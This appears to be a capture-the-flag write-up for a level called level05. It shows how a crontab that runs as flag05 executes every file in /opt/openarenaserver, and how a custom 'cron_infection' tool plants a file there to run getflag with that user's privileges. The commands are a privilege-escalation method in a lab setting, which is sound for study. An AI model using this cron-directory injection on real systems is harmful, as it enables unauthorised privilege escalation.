### Documentation
[Crontab](https://www.linuxtricks.fr/wiki/cron-et-crontab-le-planificateur-de-taches)

### External
```
BASH    cron_infection
```

### Exploit
1. You have new mail.

2. `cat /var/mail/level05`
    ```bash
   #crontab
   */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
   ```

3. `cat /usr/sbin/openarenaserver`
   ```bash
   #!/bin/sh

    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done
    ```

4. `./send level05 cron_infection`

5. `./cron_infection /opt/openarenaserver/evil getflag /tmp/flag`
